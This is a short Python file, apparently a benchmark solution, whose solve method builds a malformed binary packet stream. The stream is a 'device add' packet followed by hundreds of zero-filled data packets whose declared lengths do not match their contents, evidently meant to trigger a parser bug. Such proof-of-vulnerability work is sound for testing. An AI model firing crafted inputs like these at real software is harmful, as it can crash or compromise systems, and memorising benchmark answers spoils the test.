import struct
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        out = io.BytesIO()
        # Device add packet
        dev_add_data = b'\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00' + b'\x00' * 5
        out.write(struct.pack('<I', 26))
        out.write(dev_add_data)
        # Data packets
        n1 = 271
        d1 = 149
        n2 = 170
        d2 = 148
        header = b'\x02\x00\x00\x01\x01'
        for _ in range(n1):
            data_len = d1
            pkt_len = 13 + data_len
            out.write(struct.pack('<I', pkt_len))
            out.write(header)
            out.write(struct.pack('<I', data_len))
            out.write(b'\x00' * data_len)
        for _ in range(n2):
            data_len = d2
            pkt_len = 13 + data_len
            out.write(struct.pack('<I', pkt_len))
            out.write(header)
            out.write(struct.pack('<I', data_len))
            out.write(b'\x00' * data_len)
        return out.getvalue()
